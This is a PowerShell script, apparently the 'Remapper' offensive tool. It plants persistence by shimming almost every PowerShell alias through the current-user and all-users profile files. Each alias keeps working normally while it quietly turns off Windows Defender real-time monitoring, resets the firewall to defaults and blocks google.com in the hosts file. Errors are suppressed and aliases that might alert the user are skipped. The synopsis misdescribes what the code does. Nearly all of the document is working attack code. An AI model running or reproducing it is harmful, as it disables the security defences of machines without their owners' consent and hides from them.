<#
    .SYNOPSIS
    Script which can be used to find living off the land binaries and scripts on a target machine.
    .DESCRIPTION
    Remapper aims to leverage alias shimming and PowerShell profiles
    to shim every alias with user defined funtions and have the aliases still function normally as to not
    raise suspicions.
    .PARAMETER Outfile
    If specified output will be put into an outfile of this name
    .NOTES
    Version:        1.0
    Author:         NotoriousRebel
    Creation Date:  10/28/19
    .EXAMPLE
    PS C:\> .\remap.ps1
    .LINK
    https://github.com/NotoriousRebel/Remapper
#>

# Change these functions to suit your needs

$dd = @'
function dd {Start-Job -ScriptBlock {try{Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue }Catch{$_}} | Out-Null }
'@.Trim()
$ff = @'
function ff {Start-Job -ScriptBlock {try{(New-Object -ComObject HNetCfg.FwPolicy2).RestoreLocalFirewallDefaults()}Catch{$_}} | Out-Null}
'@.Trim()
$xx = @'
function xx {try{$x=$false;Get-Content "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue |ForEach-Object {if($_ -match "google.com"){$x = $true}};if($x -eq $false){try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue -Value "`r`n0.0.0.0    www.google.com google.com" }Catch{}}}Catch{$_}}
'@.Trim()

$orig_dct = @{ }
function create_map() {
    <#
    .SYNOPSIS
    A helper function that creates a hashmap
    .DESCRIPTION
    Given the name of the alias will retrive the definition of the alias
    and create a new entry in the hashmap with the 
    key being the alias and the value being the definition
    .PARAMETER alias
    Name of alias that will serve as key
    #>
    param([parameter(ValueFromPipeline)][string]$alias)
    if ($alias -match "\?" -or $alias -match "cd" -or $alias -match "gcb" -or $alias -match "gin" -or $alias -match "scb" -or $alias -match "%" -or $alias -match "stz" -or $alias -match "gtz" -or $alias -match "write" -or $alias -match "where" -or $alias -match "foreach") {
        # Shimming these aliases can alert users and in some cases break aliases 
        return;
    }
    $value = (Get-Alias -Name $alias).Definition
    $orig_dct[$alias] = $value
}

function shim([string]$key, [string]$value) {
    <#
    .SYNOPSIS
    Creates array that contains function definton as well as set alias command to shim alias
    .DESCRIPTION
    Given the name of the alias will retrive the definition of the alias
    and create a new entry in the hashmap with the 
    key being the alias and the value being the definition
    .PARAMETER key
    Name of alias 
    .PARAMETER value
    Definition of alias (key)
    .OUTPUTS
    arr: Array that contains two elements
    First element: String that is definition of function that contains shimmed functions as well as definition for alias
    Second element: String that redefines the alias with the Value being our shimmed functon 
    #>
    
    # If functon names have changed, new ones added, some are removed
    # Should be changed right after "$value;"
    $func_def = "function shimmed_$key {$value; xx;dd;ff}"
    $func_name = "shimmed_$key"
    $shim = 'Set-Alias -Name alias -Value val -Option AllScope,Constant -Scope Global' + ' -ErrorAction SilentlyContinue -Force'
    $full_shim = $shim.Replace("alias", $key).Replace("val", $func_name)
    $arr = @()
    $arr += $func_def
    $arr += $full_shim
    return $arr
}


function write_to([string]$path, [string]$val) {
    <#
    .SYNOPSIS
    Function that given a path and value will add that content to path
    .DESCRIPTION
    Given path and value simply adds it to file, wrapped in Try Catch statement
    .PARAMETER path
    File path to write to
    .PARAMETER value
    Value that will be appended to path
    #>
    Try {
        Add-Content -Path $path -Value $val -ErrorAction SilentlyContinue
    }
    Catch {

    }
}
function main() {
    <#
    .SYNOPSIS
    Function that given a path and value will add that content to path
    .DESCRIPTION
    Given path and value simply adds it to file, wrapped in Try Catch statement
    .PARAMETER path
    File path to write to
    .PARAMETER value
    Value that will be appended to path
    #>
    $curuser_allhosts = $PROFILE.CurrentUserAllHosts
    $allusers_allhosts = $PROFILE.AllUsersAllHosts
    
    Try {
        if (!(Test-Path -Path $curuser_allhosts)) {

            New-Item -ItemType File -Path $curuser_allhosts -Force -ErrorAction SilentlyContinue | Out-Null
        }

    }
    Catch { }
    Try {
        if (!(Test-Path -Path $allusers_allhosts)) {

            New-Item -ItemType File -Path $allusers_allhosts -Force -ErrorAction SilentlyContinue | Out-Null
        }

    }
    Catch { }
    
    Get-Alias | ForEach-Object { $_.Name | create_map }
    $all = @()
    foreach ($key in $orig_dct.Keys) {
        $val = $orig_dct[$key]
        $arr = shim $key $val
        $alias_line = $arr[0]
        $func_shim = $arr[1]
        $all += $alias_line
        $all += $func_shim
    }
    # Array that contains shimmed functions as well as set alias commands to add to profiles

    try {
        write_to $curuser_allhosts $gg
        write_to $curuser_allhosts $dd
        write_to $curuser_allhosts $ff
        write_to $curuser_allhosts $xx
        foreach ($v in $all) {
            write_to $curuser_allhosts $v
        }
    }
    
    catch { { } }
    
    try {
        write_to $allusers_allhosts $gg
        write_to $allusers_allhosts $dd
        write_to $allusers_allhosts $ff
        write_to $allusers_allhosts $xx
        foreach ($v in $all) {
            write_to $allusers_allhosts $v
        }
    }
    catch { { } }
}

main